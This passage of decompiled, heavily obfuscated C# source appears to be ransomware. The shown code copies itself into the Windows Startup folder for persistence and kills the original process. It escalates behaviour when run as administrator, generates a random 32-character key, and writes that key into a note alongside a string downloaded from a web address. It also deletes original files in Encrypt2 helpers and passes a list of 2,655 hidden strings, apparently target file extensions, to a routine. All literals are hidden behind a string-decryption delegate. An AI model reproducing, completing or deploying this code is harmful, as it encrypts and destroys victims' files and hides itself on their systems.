										QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + RhFnHiViAutuY, rSFrHwQLaPb);
									}
									else
									{
										QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + RhFnHiViAutuY, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!tRSKQaCWVf)
										{
											nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + RhFnHiViAutuY, rSFrHwQLaPb);
										}
										else
										{
											nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + RhFnHiViAutuY, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (nCZIbbbLUfspycLk)
										{
											try
											{
												File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + getString_0(107363409) + ex6.Message + getString_0(107396285));
											}
											catch (Exception)
											{
											}
										}
									}
								}
							}
							else if (!YMlgZeoTozpwYHf)
							{
								if (!tRSKQaCWVf)
								{
									QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + getString_0(107363418), rSFrHwQLaPb);
								}
								else
								{
									QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + getString_0(107363418), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!tRSKQaCWVf)
									{
										nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, rSFrHwQLaPb);
									}
									else
									{
										nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (nCZIbbbLUfspycLk)
									{
										try
										{
											File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + getString_0(107363409) + ex8.Message + getString_0(107396285));
										}
										catch (Exception)
										{
										}
									}
								}
							}
							if (tRSKQaCWVf)
							{
								if (RhFnHiViAutuY != getString_0(107363391))
								{
									jPPfleEdfBACeW(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + RhFnHiViAutuY, bytes2);
								}
								else
								{
									jPPfleEdfBACeW(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, bytes2);
								}
							}
						}
						end_IL_0636_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0cc3;
			IL_0cc3:
			WvtPVeZAyOd.Remove(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
		}

		static mBAKpdaxgGIiSOo()
		{
			Strings.CreateGetStringDelegate(typeof(mBAKpdaxgGIiSOo));
		}
	}

	private sealed class OTINmDYCTwXpOZp
	{
		public string jJgeinqiNR;

		public string RTzXFkgGql;

		public void _003CEncrypt2_003Eb__3e()
		{
			while (true)
			{
				try
				{
					File.Delete(jJgeinqiNR);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					if (File.Exists(RTzXFkgGql))
					{
						File.Delete(RTzXFkgGql);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string btrCVBaeRi;

	public static byte[] rSFrHwQLaPb;

	public static string plZapolsnYB;

	public static string PWOhwOPFeWY;

	public static List<string> kGOGGuScmQTRuRt;

	public static List<string> ZvlzfWlUJl;

	public static string tiZkWNzqoIdZ;

	public static string sQDDlGRIPwQjFTV;

	public static string qJfhhMbMTrWQdCt;

	public static string vNaHsVjBlr;

	public static int ZhTcCAsHnLUat;

	public static string hEqjITdFNHN;

	public static string XstztAKhUMHpxW;

	public static string hJzuyWNafVE;

	public static string MYHKQkjMSXPCxr;

	public static string YHXoOpwuAObQIW;

	public static string YEdRPeAKfvptZz;

	public static string nhNQRytnboBZ;

	public static string YDJWveSMrZd;

	public static List<string> UvsoQJonwwHLw;

	public static List<string> XMwazMiiElRCF;

	public static string XCSqlbZIzfcZJlho;

	public static string rCPgNwuKmHk;

	public static string kXAMkNPUFDLspZd;

	public static List<string> meZsVdOPaL;

	public static string TczZkhBGoCcniWkV;

	private static string MvrRxGAPWym;

	public static string uzPKfOTMfp;

	public static string PvKJJJyKPMVw;

	public static List<string> tWLhEuNSwber;

	public static List<string> TahItyPLJKFe;

	public static List<string> CRAbEiTgEtDnj;

	public static List<string> dIcNtpuVAxgs;

	public static string BGUZACcpXcmNaLqP;

	public static List<string> wgHtCvdMYlLMB;

	public static List<string> unWbgvDeWHnAd;

	public static string TbdYlzlCjhbGi;

	public static string zfJsAhPzuUoodAFN;

	internal static DateTime NAxACZNmujAJ;

	internal static DateTime JmyLyXYTjlzk;

	public static string IIzcsAXxpCcBT;

	public static string nnEkTZqriSbg;

	public static string cmglPGwCjHuioKN;

	public static string WoPzhGQUDLoZ;

	public static string nBtMbnwSQHReP;

	public static string ukxYAJwswfT;

	public static string OtVtHvPsNq;

	public static string PFlwcndeNzM;

	public static List<string> YEHhRPAlgeTZv;

	public static string qIWeOYgtZSNt;

	public static string BIwQlRShpHJfwXLx;

	public static string KwQPUJMcPCcoie;

	public static string FCzRfrTLNJh;

	public static string micfRgkYhouaE;

	public static string osmTRGTGUlEcU;

	public static string ZiEFjSfmxAclQ;

	public static string ziyLGCeCiW;

	public static string ewVjhJjhIvwYgDZ;

	public static string MwbPGaKLbgh;

	public static string DDSKICgrrvLazV;

	public static string YzxNECSxfbGEbC;

	public static string plBxBMiMAgL;

	public static string nyibzDOcmzAfPlAk;

	public static string bUIwkgoVzJJ;

	public static string IAoLmhAVDHKdan;

	public static string QdZxIHZGumV;

	public static string qosxdXNXJCmZpP;

	public static string NCEWjFyNHHvX;

	public static string UCnmTIRKyzLvN;

	public static string XDNbsQcChwzXpL;

	public static string TstmMrQSOXL;

	public static string BhVyePUFOPIil;

	public static string QBzcVPcsFN;

	public static string CdpVqTSZopwWL;

	public static string czzxBIIgzHhCQX;

	public static string yOzezPMztSZ;

	public static string euwWpmbhBj;

	public static string uhWcodzlbKUstEfW;

	public static string[] qpIShRZlqpoU;

	public static string kQqMJAvESmfL;

	public static bool flMhwZmYRAGAlC;

	public static string EFFiYUumCeri;

	public static bool tRSKQaCWVf;

	public static bool IsbZbMDtVgdC;

	public static bool MWuXjmDkVUm;

	public static bool vqNqgcDHiRad;

	public static string VjgrxEUFvvHY;

	public static bool nCZIbbbLUfspycLk;

	public static bool KByfhLUaMgZByu;

	public static bool BAQapJllmGdU;

	public static bool jLexrErlPOkRYi;

	public static bool YMlgZeoTozpwYHf;

	public static string jUdQCPAqaGpC;

	public static List<string> rwxrAzKfSkFklG;

	public static List<string> dixQXRkXIIGjW;

	public static List<string> AnDmoVaaCCkNd;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			jCXiRdJuRChSF CS_0024_003C_003E8__locals0 = new jCXiRdJuRChSF();
			CS_0024_003C_003E8__locals0.uDsRPfWHLPcsA = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.uDsRPfWHLPcsA) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			ZhDmasxaJg.zbUWaWGTBFZK(MvrRxGAPWym);
		}
		catch (Exception)
		{
		}
		try
		{
			if (czzxBIIgzHhCQX == getString_0(107396958))
			{
				Thread thread = new Thread(TShMpnnLnnIrUR.gsIOAwFzTv);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (hJzuyWNafVE == getString_0(107396958))
		{
			Thread.Sleep(int.Parse(MYHKQkjMSXPCxr));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && OtVtHvPsNq == getString_0(107396958))
		{
			try
			{
				ZvWBkfnfyzGs(AJakXHzLGH(getString_0(107396953)));
			}
			catch
			{
			}
		}
		try
		{
			if (nhNQRytnboBZ == getString_0(107396958) && pVWlygwXxPnhQU.raAhNwxfrIcqMwoGp())
			{
				new uxNXrlnnpxw().cWimzuuzJCxC(bool_0: false);
				pVWlygwXxPnhQU.hbbihGxeqgKa();
			}
		}
		catch (Exception)
		{
		}
		if (rCPgNwuKmHk == getString_0(107396958) && pVWlygwXxPnhQU.raAhNwxfrIcqMwoGp())
		{
			new uxNXrlnnpxw().cWimzuuzJCxC(bool_0: false);
			new uxNXrlnnpxw().aXczjuKTuSPGGf();
		}
		if (XstztAKhUMHpxW == getString_0(107396958))
		{
			QNNiaBjLhIIsGXT.FnyhSWIdjwAGKds();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396816);
			string text2 = text + Path.GetFileName(fileName);
			if (vNaHsVjBlr == getString_0(107396958) && fileName != text2)
			{
				Thread thread2 = new Thread(vNFmSYKzBhrBFTX);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (tiZkWNzqoIdZ == getString_0(107396958) && mainModule != null && fileName != text2)
			{
				try
				{
					ZhTcCAsHnLUat = veCqjBlpkTdCHcNU(0, UvsoQJonwwHLw.Count);
					File.Copy(fileName, text + UvsoQJonwwHLw[ZhTcCAsHnLUat], overwrite: true);
					Process.Start(text + UvsoQJonwwHLw[ZhTcCAsHnLUat]);
					NfybKqnWcJrqY();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (TbdYlzlCjhbGi == getString_0(107396958) && DateTime.Now < NAxACZNmujAJ)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (zfJsAhPzuUoodAFN == getString_0(107396958) && DateTime.Now > JmyLyXYTjlzk)
			{
				NfybKqnWcJrqY();
			}
		}
		catch
		{
		}
		fnKTYJlSLVr();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> tahItyPLJKFe = TahItyPLJKFe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						dfqtCTBwlwyp(getString_0(107363306), string_0);
					};
				}
				Parallel.ForEach(tahItyPLJKFe, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source = tWLhEuNSwber;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						dfqtCTBwlwyp(getString_0(107399121), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> cRAbEiTgEtDnj = CRAbEiTgEtDnj;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						dfqtCTBwlwyp(AJakXHzLGH(getString_0(107363329)), string_0);
					};
				}
				Parallel.ForEach(cRAbEiTgEtDnj, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (uhWcodzlbKUstEfW == getString_0(107396958))
				{
					string[] source2 = qpIShRZlqpoU;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							dfqtCTBwlwyp(AJakXHzLGH(getString_0(107363329)), getString_0(107363304) + string_0 + getString_0(107363295));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				if (!SIfyghAFRdICD().Contains(getString_0(107363001)))
				{
					KzgInVtpzgYN(BGUZACcpXcmNaLqP);
				}
				else
				{
					List<string> source3 = dIcNtpuVAxgs;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							dfqtCTBwlwyp(AJakXHzLGH(izMuybnTAClZSoX(getString_0(107363290))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				List<string> source4 = wgHtCvdMYlLMB;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						dfqtCTBwlwyp(AJakXHzLGH(getString_0(107363265)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source5 = unWbgvDeWHnAd;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						dfqtCTBwlwyp(getString_0(107363216), string_0);
					};
				}
				Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MWuXjmDkVUm)
			{
				try
				{
					Thread thread4 = new Thread(kNzrhOLlcaFRCSu.YrogIvJmHUoS);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			dfqtCTBwlwyp(getString_0(107396811), AJakXHzLGH(getString_0(107396830)));
			dfqtCTBwlwyp(getString_0(107396811), AJakXHzLGH(getString_0(107396725)));
			dfqtCTBwlwyp(AJakXHzLGH(getString_0(107397212)), AJakXHzLGH(getString_0(107397167)));
			dfqtCTBwlwyp(AJakXHzLGH(getString_0(107397212)), AJakXHzLGH(getString_0(107397037)));
		}
		if (XCSqlbZIzfcZJlho == getString_0(107396958) && lFqubDkbQuyEda() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(ZoJIiSGwpVOiHY.DgtmjthUxaS);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = PvKJJJyKPMVw == getString_0(107396958);
		SecureString secureString = new SecureString();
		if (cmglPGwCjHuioKN == getString_0(107396415))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			sQDDlGRIPwQjFTV = getString_0(107396410);
		}
		qJfhhMbMTrWQdCt = PmmjrDLLHGk.kPAAXvpwzUaT(ayItgFuYWuh(secureString));
		if (ziyLGCeCiW == getString_0(107396958))
		{
			bBLzBVIPeRuqMay();
		}
		if (BAQapJllmGdU)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), jUdQCPAqaGpC)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), jUdQCPAqaGpC), string.Concat(AJakXHzLGH(getString_0(107396333)), new WebClient().DownloadString(AJakXHzLGH(getString_0(107396308))), getString_0(107396267), AJakXHzLGH(getString_0(107396294)), DateTime.Now, getString_0(107396267), AJakXHzLGH(getString_0(107396253)), qJfhhMbMTrWQdCt));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), jUdQCPAqaGpC), getString_0(107396708) + qJfhhMbMTrWQdCt);
				}
			}
			catch (Exception ex7)
			{
				if (nCZIbbbLUfspycLk)
				{
					try
					{
						File.AppendAllText(VjgrxEUFvvHY, getString_0(107396679) + ex7.Message + getString_0(107396267));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		GCgryWJGqPqrqa.pCqulEGdJctLP(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), UCnmTIRKyzLvN), znZsibIawm(qJfhhMbMTrWQdCt), null, null, getString_0(107396598), getString_0(107396613), null);
		if (plBxBMiMAgL == getString_0(107396958))
		{
			try
			{
				DlfhshYenk();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nqbdGYjNXfcb();
		}
		try
		{
			PaeYQCUbTYk(new string[1] { getString_0(107396564) }, new string[2655]
			{
				getString_0(107396555),
				getString_0(107396582),
				getString_0(107396577),
				getString_0(107396572),
				getString_0(107396535),
				getString_0(107396530),
				getString_0(107396525),
				getString_0(107396552),
				getString_0(107396547),
				getString_0(107396542),
				getString_0(107396537),
				getString_0(107396500),
				getString_0(107396495),
				getString_0(107396490),
				getString_0(107396517),
				getString_0(107396512),
				getString_0(107396507),
				getString_0(107396470),
				getString_0(107396461),
				getString_0(107396488),
				getString_0(107396483),
				getString_0(107396478),
				getString_0(107395925),
				getString_0(107395920),
				getString_0(107395915),
				getString_0(107395942),
				getString_0(107395937),
				getString_0(107395896),
				getString_0(107395891),
				getString_0(107395886),
				getString_0(107395881),
				getString_0(107395908),
				getString_0(107395903),
				getString_0(107395898),
				getString_0(107395857),
				getString_0(107395852),
				getString_0(107395879),
				getString_0(107395874),
				getString_0(107395869),
				getString_0(107395832),
				getString_0(107395827),
				getString_0(107395822),
				getString_0(107395845),
				getString_0(107395840),
				getString_0(107395835),
				getString_0(107395798),
				getString_0(107395793),
				getString_0(107395788),
				getString_0(107395811),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395754),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395771),
				getString_0(107395734),
				getString_0(107395729),
				getString_0(107395752),
				getString_0(107395747),
				getString_0(107395738),
				getString_0(107395701),
				getString_0(107395696),
				getString_0(107395691),
				getString_0(107395718),
				getString_0(107395713),
				getString_0(107395708),
				getString_0(107396183),
				getString_0(107396178),
				getString_0(107396169),
				getString_0(107396192),
				getString_0(107396151),
				getString_0(107396142),
				getString_0(107396137),
				getString_0(107396164),
				getString_0(107396159),
				getString_0(107396154),
				getString_0(107396117),
				getString_0(107396084),
				getString_0(107396103),
				getString_0(107396054),
				getString_0(107396045),
				getString_0(107396072),
				getString_0(107396067),
				getString_0(107396062),
				getString_0(107396057),
				getString_0(107396020),
				getString_0(107396015),
				getString_0(107396010),
				getString_0(107396037),
				getString_0(107396028),
				getString_0(107395987),
				getString_0(107395978),
				getString_0(107396005),
				getString_0(107395996),
				getString_0(107395959),
				getString_0(107395954),
				getString_0(107395949),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395966),
				getString_0(107395413),
				getString_0(107395408),
				getString_0(107395403),
				getString_0(107395422),
				getString_0(107395417),
				getString_0(107395380),
				getString_0(107395371),
				getString_0(107395394),
				getString_0(107395349),
				getString_0(107395368),
				getString_0(107395355),
				getString_0(107395310),
				getString_0(107395329),
				getString_0(107395284),
				getString_0(107395303),
				getString_0(107395290),
				getString_0(107395245),
				getString_0(107395272),
				getString_0(107395267),
				getString_0(107395262),
				getString_0(107395221),
				getString_0(107395216),
				getString_0(107395211),
				getString_0(107395238),
				getString_0(107395233),
				getString_0(107395228),
				getString_0(107395191),
				getString_0(107395186),
				getString_0(107395181),
				getString_0(107395204),
				getString_0(107395195),
				getString_0(107395666),
				getString_0(107395657),
				getString_0(107395684),
				getString_0(107395679),
				getString_0(107395638),
				getString_0(107395629),
				getString_0(107395652),
				getString_0(107395647),
				getString_0(107395642),
				getString_0(107395605),
				getString_0(107395600),
				getString_0(107395595),
				getString_0(107395622),
				getString_0(107395613),
				getString_0(107395576),
				getString_0(107395571),
				getString_0(107395566),
				getString_0(107395589),
				getString_0(107395584),
				getString_0(107395579),
				getString_0(107395542),
				getString_0(107395537),
				getString_0(107395532),
				getString_0(107395559),
				getString_0(107395554),
				getString_0(107395549),
				getString_0(107395512),
				getString_0(107395507),
				getString_0(107395498),
				getString_0(107395525),
				getString_0(107395520),
				getString_0(107395479),
				getString_0(107395474),
				getString_0(107395469),
				getString_0(107395496),
				getString_0(107395487),
				getString_0(107395482),
				getString_0(107395441),
				getString_0(107395464),
				getString_0(107395459),
				getString_0(107395454),
				getString_0(107395449),
				getString_0(107394900),
				getString_0(107394895),
				getString_0(107394890),
				getString_0(107394917),
				getString_0(107394912),
				getString_0(107394907),
				getString_0(107394870),
				getString_0(107394865),
				getString_0(107394888),
				getString_0(107394879),
				getString_0(107394874),
				getString_0(107394837),
				getString_0(107394832),
				getString_0(107394855),
				getString_0(107394850),
				getString_0(107394845),
				getString_0(107394808),
				getString_0(107394799),
				getString_0(107394794),
				getString_0(107394817),
				getString_0(107394812),
				getString_0(107394771),
				getString_0(107394766),
				getString_0(107394789),
				getString_0(107394784),
				getString_0(107394779),
				getString_0(107394738),
				getString_0(107394733),
				getString_0(107394760),
				getString_0(107394755),
				getString_0(107394710),
				getString_0(107394705),
				getString_0(107394672),
				getString_0(107394667),
				getString_0(107394694),
				getString_0(107394689),
				getString_0(107394684),
				getString_0(107395159),
				getString_0(107395154),
				getString_0(107395149),
				getString_0(107395176),
				getString_0(107395171),
				getString_0(107395166),
				getString_0(107395161),
				getString_0(107395124),
				getString_0(107395115),
				getString_0(107395142),
				getString_0(107395137),
				getString_0(107395132),
				getString_0(107395095),
				getString_0(107395086),
				getString_0(107395109),
				getString_0(107395100),
				getString_0(107395063),
				getString_0(107395058),
				getString_0(107395053),
				getString_0(107395076),
				getString_0(107395067),
				getString_0(107395022),
				getString_0(107395017),
				getString_0(107395044),
				getString_0(107395035),
				getString_0(107394986),
				getString_0(107395009),
				getString_0(107395004),
				getString_0(107394967),
				getString_0(107394962),
				getString_0(107394957),
				getString_0(107394980),
				getString_0(107394975),
				getString_0(107394926),
				getString_0(107394921),
				getString_0(107394944),
				getString_0(107394939),
				getString_0(107394390),
				getString_0(107394385),
				getString_0(107394380),
				getString_0(107394407),
				getString_0(107394402),
				getString_0(107394397),
				getString_0(107394356),
				getString_0(107394351),
				getString_0(107394346),
				getString_0(107394369),
				getString_0(107394328),
				getString_0(107394319),
				getString_0(107394314),
				getString_0(107394341),
				getString_0(107394336),
				getString_0(107394331),
				getString_0(107394294),
				getString_0(107394285),
				getString_0(107394312),
				getString_0(107394307),
				getString_0(107394302),
				getString_0(107394297),
				getString_0(107394260),
				getString_0(107394251),
				getString_0(107394266),
				getString_0(107394229),
				getString_0(107394224),
				getString_0(107394219),
				getString_0(107394246),
				getString_0(107394241),
				getString_0(107394236),
				getString_0(107394199),
				getString_0(107394194),
				getString_0(107394189),
				getString_0(107394216),
				getString_0(107394211),
				getString_0(107394206),
				getString_0(107394201),
				getString_0(107394164),
				getString_0(107394159),
				getString_0(107394154),
				getString_0(107394177),
				getString_0(107394172),
				getString_0(107394643),
				getString_0(107394634),
				getString_0(107394661),
				getString_0(107394656),
				getString_0(107394651),
				getString_0(107394610),
				getString_0(107394605),
				getString_0(107394632),
				getString_0(107394627),
				getString_0(107394622),
				getString_0(107394617),
				getString_0(107394580),
				getString_0(107394571),
				getString_0(107394598),
				getString_0(107394589),
				getString_0(107394552),
				getString_0(107394547),
				getString_0(107394538),
				getString_0(107394565),
				getString_0(107394560),
				getString_0(107394555),
				getString_0(107394518),
				getString_0(107394513),
				getString_0(107394508),
				getString_0(107394535),
				getString_0(107394530),
				getString_0(107394521),
				getString_0(107394484),
				getString_0(107394479),
				getString_0(107394474),
				getString_0(107394489),
				getString_0(107394452),
				getString_0(107394447),
				getString_0(107394442),
				getString_0(107394469),
				getString_0(107394464),
				getString_0(107394459),
				getString_0(107394422),
				getString_0(107394417),
				getString_0(107394412),
				getString_0(107394439),
				getString_0(107394434),
				getString_0(107394425),
				getString_0(107393876),
				getString_0(107393867),
				getString_0(107393886),
				getString_0(107393881),
				getString_0(107393844),
				getString_0(107393839),
				getString_0(107393834),
				getString_0(107393861),
				getString_0(107393852),
				getString_0(107393815),
				getString_0(107393810),
				getString_0(107393805),
				getString_0(107393828),
				getString_0(107393823),
				getString_0(107393818),
				getString_0(107393777),
				getString_0(107393772),
				getString_0(107393791),
				getString_0(107393786),
				getString_0(107393745),
				getString_0(107393740),
				getString_0(107393763),
				getString_0(107393758),
				getString_0(107393753),
				getString_0(107393736),
				getString_0(107393727),
				getString_0(107393722),
				getString_0(107393681),
				getString_0(107393676),
				getString_0(107393703),
				getString_0(107393698),
				getString_0(107393693),
				getString_0(107393656),
				getString_0(107393651),
				getString_0(107393646),
				getString_0(107393669),
				getString_0(107393664),
				getString_0(107393659),
				getString_0(107394134),
				getString_0(107394129),
				getString_0(107394124),
				getString_0(107394147),
				getString_0(107394142),
				getString_0(107394137),
				getString_0(107394100),
				getString_0(107394095),
				getString_0(107394090),
				getString_0(107394113),
				getString_0(107394072),
				getString_0(107394063),
				getString_0(107394086),
				getString_0(107394081),
				getString_0(107394040),
				getString_0(107394031),
				getString_0(107394054),
				getString_0(107394045),
				getString_0(107394004),
				getString_0(107393999),
				getString_0(107393994),
				getString_0(107394017),
				getString_0(107394012),
				getString_0(107393971),
				getString_0(107393966),
				getString_0(107393961),
				getString_0(107393988),
				getString_0(107393983),
				getString_0(107393942),
				getString_0(107393937),
				getString_0(107393932),
				getString_0(107393959),
				getString_0(107393954),
				getString_0(107393949),
				getString_0(107393912),
				getString_0(107393923),
				getString_0(107393918),
				getString_0(107393913),
				getString_0(107393364),
				getString_0(107393359),
				getString_0(107393354),
				getString_0(107393381),
				getString_0(107393372),
				getString_0(107393331),
				getString_0(107393326),
				getString_0(107393345),
				getString_0(107393340),
				getString_0(107393299),
				getString_0(107393294),
				getString_0(107393317),
				getString_0(107393312),
				getString_0(107393271),
				getString_0(107393274),
				getString_0(107393249),
				getString_0(107393208),
				getString_0(107393199),
				getString_0(107393222),
				getString_0(107393209),
				getString_0(107393168),
				getString_0(107393163),
				getString_0(107393186),
				getString_0(107393177),
				getString_0(107393140),
				getString_0(107393135),
				getString_0(107393130),
				getString_0(107393157),
				getString_0(107393152),
				getString_0(107393147),
				getString_0(107393622),
				getString_0(107393617),
				getString_0(107393612),
				getString_0(107393639),
				getString_0(107393634),
				getString_0(107393629),
				getString_0(107393592),
				getString_0(107393587),
				getString_0(107393582),
				getString_0(107393577),
				getString_0(107393596),
				getString_0(107393551),
				getString_0(107393526),
				getString_0(107393529),
				getString_0(107393492),
				getString_0(107393483),
				getString_0(107393506),
				getString_0(107393461),
				getString_0(107393476),
				getString_0(107393471),
				getString_0(107393466),
				getString_0(107393429),
				getString_0(107393420),
				getString_0(107393443),
				getString_0(107393438),
				getString_0(107393397),
				getString_0(107393392),
				getString_0(107393387),
				getString_0(107393414),
				getString_0(107393401),
				getString_0(107392848),
				getString_0(107392843),
				getString_0(107392870),
				getString_0(107392861),
				getString_0(107392824),
				getString_0(107392811),
				getString_0(107392838),
				getString_0(107392829),
				getString_0(107392792),
				getString_0(107392783),
				getString_0(107392778),
				getString_0(107392801),
				getString_0(107392760),
				getString_0(107392747),
				getString_0(107392762),
				getString_0(107392717),
				getString_0(107392744),
				getString_0(107392739),
				getString_0(107392734),
				getString_0(107392729),
				getString_0(107392692),
				getString_0(107392687),
				getString_0(107392682),
				getString_0(107392709),
				getString_0(107392704),
				getString_0(107392699),
				getString_0(107392662),
				getString_0(107392657),
				getString_0(107392652),
				getString_0(107392675),
				getString_0(107392670),
				getString_0(107392665),
				getString_0(107392628),
				getString_0(107392623),
				getString_0(107392618),
				getString_0(107392641),
				getString_0(107392636),
				getString_0(107393111),
				getString_0(107393098),
				getString_0(107393125),
				getString_0(107393120),
				getString_0(107393115),
				getString_0(107393078),
				getString_0(107393073),
				getString_0(107393068),
				getString_0(107393095),
				getString_0(107393090),
				getString_0(107393085),
				getString_0(107393044),
				getString_0(107393039),
				getString_0(107393034),
				getString_0(107393061),
				getString_0(107393052),
				getString_0(107393015),
				getString_0(107393006),
				getString_0(107393001),
				getString_0(107393028),
				getString_0(107393023),
				getString_0(107393018),
				getString_0(107392977),
				getString_0(107392972),
				getString_0(107392991),
